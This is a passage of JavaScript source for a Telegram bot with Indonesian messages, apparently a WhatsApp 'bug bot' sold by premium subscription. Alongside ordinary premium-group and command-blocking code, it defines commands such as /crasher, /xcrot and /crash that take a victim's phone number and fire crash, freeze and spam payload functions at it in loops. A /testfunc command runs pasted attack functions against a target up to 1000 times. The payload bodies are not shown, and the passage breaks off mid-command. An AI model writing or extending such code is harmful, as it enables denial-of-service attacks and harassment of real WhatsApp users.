        } catch (e) {
          return ctx.reply(`❌ Username @${username} tidak ditemukan!`);
        }
      } else {
        // TARGET DIRI SENDIRI
        targetUser = ctx.from;
      }
    }
    
    // TAMPILKAN ID
    await ctx.reply(`
🆔 *ID TELEGRAM*

👤 *Nama:* ${targetUser.first_name || "-"} ${targetUser.last_name || ""}
📛 *Username:* ${targetUser.username ? `@${targetUser.username}` : "-"}
🔢 *User ID:* \`${targetUser.id}\`

${targetUser.id ? `📋 *Klik ID untuk copy:* \`${targetUser.id}\`` : ""}
    `, { 
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📋 COPY ID", copy_text: { text: String(targetUser.id) }, style: "Primary" }
          ]
        ]
      }  
    });
    
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan. Pastikan username valid!");
  }
});
// ==================== GROUP PREMIUM SYSTEM ====================
// Letakkan kode ini di BOTTOM file korupsi.js kamu, SEBELUM bot.launch()

// ==================== GROUP PREMIUM SYSTEM (TANPA TOMBOL) ====================

const premiumGroupsFile = "./database/premiumGroups.json";

// Buat folder jika belum ada
if (!fs.existsSync("./database")) {
  fs.mkdirSync("./database", { recursive: true });
}

// ==================== FUNGSI GROUP PREMIUM ====================

// Load premium groups
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

// Save premium groups
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

// Cek apakah group premium
function isGroupPremium(groupId) {
  const groups = loadPremiumGroups();
  return groups.some(item => item.startsWith(groupId.toString() + "|"));
}

// Cek expired dan auto hapus
function checkAndCleanExpiredGroups() {
  const groups = loadPremiumGroups();
  let changed = false;
  
  for (const item of groups) {
    const [groupId, expiredTimestamp] = item.split("|");
    if (Date.now() > parseInt(expiredTimestamp)) {
      removeGroupPremium(groupId);
      changed = true;
    }
  }
  
  if (changed) {
    console.log("✅ Expired premium groups cleaned");
  }
}

// Tambah group premium
function addGroupPremium(groupId, days) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  // Cek apakah sudah ada
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (exists) {
    return { success: false, message: "Group sudah premium" };
  }
  
  // Hitung expired date
  const expiredDate = new Date();
  expiredDate.setDate(expiredDate.getDate() + days);
  const expiredTimestamp = expiredDate.getTime();
  const formattedExpired = expiredDate.toLocaleDateString('id-ID', {
    day: 'numeric',
    month: 'long',
    year: 'numeric'
  });
  
  // Simpan
  premiumGroups.push(`${groupId}|${expiredTimestamp}`);
  savePremiumGroups(premiumGroups);
  
  return { 
    success: true, 
    message: `Group premium aktif selama ${days} hari`,
    expired: formattedExpired
  };
}

// Hapus group premium
function removeGroupPremium(groupId) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (!exists) return false;
  
  premiumGroups = premiumGroups.filter(item => !item.startsWith(`${groupId}|`));
  savePremiumGroups(premiumGroups);
  return true;
}

// ==================== COMMAND ADD GROUP PREMIUM ====================

bot.command('addgrouppremium', async (ctx) => {
    // CEK OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner / admin");
    }
    
    // HARUS DI DALAM GROUP
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ ☇ Command ini hanya bisa digunakan di dalam group");
    }
    
    const args = ctx.message.text.split(" ");
    let days = 30; // default 30 hari
    
    if (args.length >= 2) {
        days = parseInt(args[1]);
        if (isNaN(days) || days <= 0) {
            return ctx.reply("❌ ☇ Durasi harus angka positif!\nContoh: /addgrouppremium 30");
        }
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    const adminName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    // Cek apakah sudah premium
    if (isGroupPremium(groupId)) {
        return ctx.reply(
            `<blockquote><b>⚠️ GROUP SUDAH PREMIUM</b>\n\n` +
            `📛 Nama: ${groupName}\n` +
            `🆔 ID: <code>${groupId}</code>\n\n` +
            `Group ini sudah terdaftar sebagai premium!</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
    
    // Tambah premium
    const result = addGroupPremium(groupId, days);
    
    if (result.success) {
        ctx.reply(
            `<blockquote><b>✅ GROUP PREMIUM BERHASIL DITAMBAHKAN!</b>\n\n` +
            `📛 Nama Group: ${groupName}\n` +
            `🆔 ID Group: <code>${groupId}</code>\n` +
            `👤 Ditambahkan oleh: ${adminName}\n` +
            `📅 Durasi: ${days} hari\n` +
            `⏰ Expired: ${result.expired}\n\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `✨ Group sekarang memiliki akses premium! ✨</blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        ctx.reply(
            `<blockquote><b>❌ GAGAL TAMBAH PREMIUM</b>\n\n` +
            `📌 Error: ${result.message}</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

// ==================== COMMAND DELETE GROUP PREMIUM ====================

bot.command('delgrouppremium', async (ctx) => {
    // CEK OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner / admin");
    }
    
    // HARUS DI DALAM GROUP
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ ☇ Command ini hanya bisa digunakan di dalam group");
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    
    // Cek apakah premium
    if (!isGroupPremium(groupId)) {
        return ctx.reply(`⚠️ Group *${groupName}* tidak terdaftar sebagai premium!`, { parse_mode: "Markdown" });
    }
    
    // Hapus premium
    const success = removeGroupPremium(groupId);
    
    if (success) {
        ctx.reply(
            `✅ *GROUP PREMIUM BERHASIL DIHAPUS!*\n\n` +
            `📛 Nama: ${groupName}\n` +
            `🆔 ID: \`${groupId}\`\n\n` +
            `Group tidak lagi memiliki akses premium.`,
            { parse_mode: "Markdown" }
        );
    } else {
        ctx.reply(`❌ Gagal menghapus premium!`, { parse_mode: "Markdown" });
    }
});

// ==================== COMMAND LIST GROUP PREMIUM ====================

bot.command('listgrouppremium', async (ctx) => {
    // CEK OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner / admin");
    }
    
    checkAndCleanExpiredGroups();
    const premiumGroups = loadPremiumGroups();
    
    if (premiumGroups.length === 0) {
        return ctx.reply("📋 Belum ada group yang terdaftar sebagai premium.");
    }
    
    let listMessage = "📋 *DAFTAR GROUP PREMIUM*\n\n";
    
    for (let i = 0; i < premiumGroups.length; i++) {
        const [groupId, expiredTimestamp] = premiumGroups[i].split("|");
        const expiredDate = new Date(parseInt(expiredTimestamp));
        const formattedDate = expiredDate.toLocaleDateString("id-ID", {
            day: "numeric",
            month: "long",
            year: "numeric"
        });
        
        listMessage += `${i + 1}. ID: \`${groupId}\`\n`;
        listMessage += `   Expired: ${formattedDate}\n\n`;
    }
    
    ctx.reply(listMessage, { parse_mode: "Markdown" });
});

// ==================== BLOCK CMD (BUG DOANG) ====================
// ==================== BLOCK CMD (FULL BUG COMMANDS) ====================
// ==================== BLOCK CMD (VERSI BAGUS) ====================
const CMD_FILE = "./database/blcmd.json";
let disabledCmd = [];

// BUAT FOLDER DATABASE JIKA BELUM ADA
if (!fs.existsSync("./database")) {
    fs.mkdirSync("./database", { recursive: true });
}

// LOAD DATA
function loadCmd() {
    try {
        if (!fs.existsSync(CMD_FILE)) return [];
        return JSON.parse(fs.readFileSync(CMD_FILE, "utf8"));
    } catch {
        return [];
    }
}

function saveCmd(data) {
    fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}

// CLEAN COMMAND NAME (TETAP PERTAHANKAN KAPITAL)
function cleanCmdName(input) {
    // HANYA HAPUS / DIAWAL, TIDAK MENGUBAH HURUF BESAR/KECIL
    return input.replace(/^\//, '').replace(/[^a-zA-Z0-9_]/g, '').trim();
}

// LABEL TYPE UNTUK TAMPILAN PESAN SAJA
// Menampilkan nama fitur sesuai command yang sedang dipanggil.
function getCommandType(ctx) {
    const raw = ctx?.message?.text?.split(/\s+/)?.[0] || "";
    const cmd = cleanCmdName(raw).toLowerCase();

    const labels = {
        crasher: "Buldozer",
        xdread: "Blank",
        xcrot: "Freze Hard",
        pentol: "Combo",
        crash: "Crash No Click",
        xbakso: "Delay Bebas Spam",
        xdelay: "Delay Bebas Spam",
        slayerdelay: "Delay Bebas Spam",
        spamkiller: "Delay Bebas Spam",
        xcline: "DelayBebas Spam",
        xbugs: "Delay Bebas Spam"
    };

    return labels[cmd] || cleanCmdName(raw);
}

// CEK STATUS COMMAND (ON/OFF)
function getCmdStatus(cmd) {
    return disabledCmd.includes(cmd) ? "❌ OFF" : "✅ ON";
}

// LOAD AWAL
disabledCmd = loadCmd();

// DAFTAR COMMAND YANG BISA DIBLOKIR (PAKE NAMA ASLI YANG LU PAKE)
const targetCommands = ["crasher", "xdread", "xcrot", "pentol", "crash", "xbakso", "Xdelay", "slayerdelay", "spamkiller", "Xcline", "Xbugs", "groupban"];

// MIDDLEWARE CEK COMMAND YANG DI BLOCK
bot.use((ctx, next) => {
    if (!ctx.message || !ctx.message.text) return next();

    const rawCmd = ctx.message.text.split(" ")[0];
    const cmd = cleanCmdName(rawCmd);

    if (!rawCmd.startsWith("/")) return next();
    if (ctx.from.id == ownerID) return next();
    
    if (!targetCommands.includes(cmd)) return next();

    if (disabledCmd.includes(cmd)) {
        return ctx.reply(`
<blockquote><b>🚫 COMMAND SEDANG DIBLOKIR</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  Command <code>/${cmd}</code> saat ini sedang
┃  diblokir oleh owner bot.
┃
┃  ❓ Tidak bisa menggunakan command ini
┃  sampai dibuka kembali oleh owner.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>

📌 <i>Gunakan /cmd untuk melihat command yang diblokir</i>
        `, { parse_mode: "HTML" });
    }

    return next();
});

// COMMAND BLOCK
bot.command("blockcmd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner!");
    }

    let rawCmd = ctx.message.text.split(" ")[1];
    if (!rawCmd) {
        return ctx.reply(`
<blockquote><b>📝 CARA MEMBLOKIR COMMAND</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  <code>/blockcmd &lt;nama_command&gt;</code>
┃
┃  📌 Contoh:
┃  ├ <code>/blockcmd shirodelay</code>
┃  ├ <code>/blockcmd Xcline</code>
┃  └ <code>/blockcmd xcrot</code>
┃
┃  📋 Command yang bisa diblokir:
┃  ├ /crasher      ├ /xbakso
┃  ├ /xdread       ├ /Xdelay
┃  ├ /xcrot         ├ /slayerdelay 
┃  ├ /pentol        ├ /Xbugs
┃  ├ /crash         ├ /groupban
┃  └ /spamkiller    └ /xcline    
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
        `, { parse_mode: "HTML" });
    }

    const cmd = cleanCmdName(rawCmd);
    
    if (!targetCommands.includes(cmd)) {
        return ctx.reply(`<blockquote><b>❌ COMMAND TIDAK DITEMUKAN</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  Command <code>/${cmd}</code> tidak ada dalam
┃  daftar command yang bisa diblokir.
┃
┃  Gunakan <code>/cmd</code> untuk melihat
┃  daftar command yang tersedia.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`, { parse_mode: "HTML" });
    }
    
    if (disabledCmd.includes(cmd)) {
        return ctx.reply(`<blockquote><b>⚠️ COMMAND SUDAH DIBLOKIR</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  Command <code>/${cmd}</code> sudah dalam
┃  status terblokir sebelumnya.
┃
┃  💡 Gunakan <code>/unblockcmd ${cmd}</code>
┃     jika ingin membukanya.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`, { parse_mode: "HTML" });
    }

    disabledCmd.push(cmd);
    saveCmd(disabledCmd);

    ctx.reply(`
<blockquote><b>✅ COMMAND BERHASIL DIBLOKIR</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  📌 Command: <code>/${cmd}</code>
┃  👤 Diblokir oleh: @${ctx.from.username || ctx.from.first_name}
┃  ⏰ Waktu: ${new Date().toLocaleString()}
┃
┃  ⚠️ Command ini sekarang TIDAK BISA
┃     digunakan oleh user biasa.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
    `, { parse_mode: "HTML" });
});

// COMMAND UNBLOCK
bot.command("unblockcmd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner!");
    }

    let rawCmd = ctx.message.text.split(" ")[1];
    if (!rawCmd) {
        return ctx.reply(`
<blockquote><b>📝 CARA MEMBUKA BLOCK COMMAND</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  <code>/unblockcmd &lt;nama_command&gt;</code>
┃
┃  📌 Contoh:
┃  ├ <code>/unblockcmd xdread</code>
┃  ├ <code>/unblockcmd Xcline</code>
┃  └ <code>/unblockcmd xcrot</code>
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
        `, { parse_mode: "HTML" });
    }

    const cmd = cleanCmdName(rawCmd);

    if (!disabledCmd.includes(cmd)) {
        return ctx.reply(`<blockquote><b>⚠️ COMMAND TIDAK DIBLOKIR</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  Command <code>/${cmd}</code> tidak dalam
┃  status terblokir.
┃
┃  💡 Command ini sudah AKTIF dan bisa
┃     digunakan oleh user biasa.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>`, { parse_mode: "HTML" });
    }

    disabledCmd = disabledCmd.filter(c => c !== cmd);
    saveCmd(disabledCmd);

    ctx.reply(`
<blockquote><b>✅ COMMAND BERHASIL DIBUKA</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃
┃  📌 Command: <code>/${cmd}</code>
┃  👤 Dibuka oleh: @${ctx.from.username || ctx.from.first_name}
┃  ⏰ Waktu: ${new Date().toLocaleString()}
┃
┃  ✅ Command ini sekarang SUDAH BISA
┃     digunakan kembali oleh user biasa.
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
    `, { parse_mode: "HTML" });
});

// COMMAND LIST BLOCK
bot.command("cmd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Akses hanya untuk owner!");
    }

    const blocked = targetCommands.filter(cmd => disabledCmd.includes(cmd));
    const active = targetCommands.filter(cmd => !disabledCmd.includes(cmd));

    let msg = `
<blockquote><b>📋 DAFTAR COMMAND BOT</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

    if (active.length > 0) {
        msg += `┃ 🟢 <b>AKTIF (${active.length})</b>\n`;
        msg += `┃ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        active.forEach(cmd => {
            msg += `┃    ✅ <code>/${cmd}</code>\n`;
        });
        msg += `┃\n`;
    }

    if (blocked.length > 0) {
        msg += `┃ 🔴 <b>DIBLOKIR (${blocked.length})</b>\n`;
        msg += `┃ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        blocked.forEach(cmd => {
            msg += `┃    ❌ <code>/${cmd}</code>\n`;
        });
    }

    if (active.length === 0 && blocked.length === 0) {
        msg += `┃ 📭 Tidak ada command yang terdaftar\n`;
    }

    msg += `
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
<blockquote>
📊 <b>STATISTIK</b>
├ 🟢 Aktif   : ${active.length} command
├ 🔴 Diblokir: ${blocked.length} command
└ 📌 Total   : ${targetCommands.length} command
</blockquote>
💡 <i>Gunakan /blockcmd atau /unblockcmd untuk mengelola</i>
    `;

    ctx.reply(msg, { parse_mode: "HTML" });
});

bot.command('cekpremiumgroup', async (ctx) => {
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ ☇ Command ini hanya bisa digunakan di dalam group");
    }
    
    const groupId = ctx.chat.id.toString();
    const groupName = ctx.chat.title || "Tidak ada nama";
    
    checkAndCleanExpiredGroups();
    const premiumGroups = loadPremiumGroups();
    const entry = premiumGroups.find(item => item.startsWith(`${groupId}|`));
    
    if (!entry) {
        return ctx.reply(
            `⚠️ *GROUP PREMIUM TIDAK AKTIF*\n\n` +
            `📛 Nama: ${groupName}\n` +
            `🆔 ID: \`${groupId}\`\n` +
            `📌 Status: Tidak premium\n\n` +
            `Hubungi owner untuk upgrade premium!`,
            { parse_mode: "Markdown" }
        );
    }
    
    const expiredTimestamp = parseInt(entry.split("|")[1]);
    const remaining = expiredTimestamp - Date.now();
    
    if (remaining <= 0) {
        removeGroupPremium(groupId);
        return ctx.reply(
            `⚠️ *GROUP PREMIUM EXPIRED*\n\n` +
            `📛 Nama: ${groupName}\n` +
            `🆔 ID: \`${groupId}\`\n` +
            `📌 Status: Premium telah habis\n\n` +
            `Hubungi owner untuk perpanjang!`,
            { parse_mode: "Markdown" }
        );
    }
    
    const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
    const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
    
    ctx.reply(
        `✅ *GROUP PREMIUM AKTIF*\n\n` +
        `📛 Nama: ${groupName}\n` +
        `🆔 ID: \`${groupId}\`\n` +
        `⏰ Sisa waktu: ${days} hari ${hours} jam\n` +
        `📌 Status: Aktif`,
        { parse_mode: "Markdown" }
    );
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("testfunc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunc 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote> ⬡═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡ 
⛧ Target: ${q}
⛧ Type: Unknown Function
⛧ Status: Process
(🍁) King Naren</b></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(sock, target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b> ⬡═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
⛧ Target: ${q}
⛧ Type: Unknown Function
⛧ Status: Success
(🍁) King Naren</b></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//--------------COMMANDanjing --------------//
bot.command("crasher", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /crasher 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 15; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await Buldozer(sock, target);
    await Buldozer(sock, target);
    await Buldozer(sock, target);
    await Buldozer(sock, target);
    await Buldozer(sock, target);
    await Buldozer(sock, target);
  }
});

bot.command("xdread", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 15; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await Blank(sock, target);
    await Blank(sock, target);
    await Blank(sock, target);
    await Blank(sock, target);
    await Blank(sock, target);
    await Blank(sock, target);
  }
});

bot.command("xcrot", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 20; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await FreezeChatApa(sock, target);
    await FreezeChatApa(sock, target);
    await FreezeChatApa(sock, target);
    await FreezeChatApa(sock, target);
    await FreezeChatApa(sock, target);
    await FreezeChatApa(sock, target);
  }
});

bot.command("pentol", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 15; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await XkaClick(sock, target);
    await XkaClick(sock, target);
    await XkaClick(sock, target);
    await XkaClick(sock, target);
    await XkaClick(sock, target);
    await XkaClick(sock, target);
  }
});

bot.command("crash", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
  caption: `
<pre>⿻χ-ɖʀєαɖ⿻

payload
◉ Target: ${number}
◉ Type: ${getCommandType(ctx)}
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
χ-ɖʀєαɖ</pre>`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[
      {
        text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
        url: `https://wa.me/${number}`, style: "primary"
      },
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/Razzxyubot", style: "danger"
      }
    ]]
  }
});

  const speed = 10;
  const initialDelay = 0;

  for (let i = 0; i < 10; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await m(sock, target);
    await m(sock, target);
    await m(sock, target);
    await m(sock, target);
    await m(sock, target);
    await m(sock, target);
  }
});

//batas suci

bot.command("xbakso", checkWhatsAppConnection, checkPremiumOrGroupPremium, checkJoinChannel, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
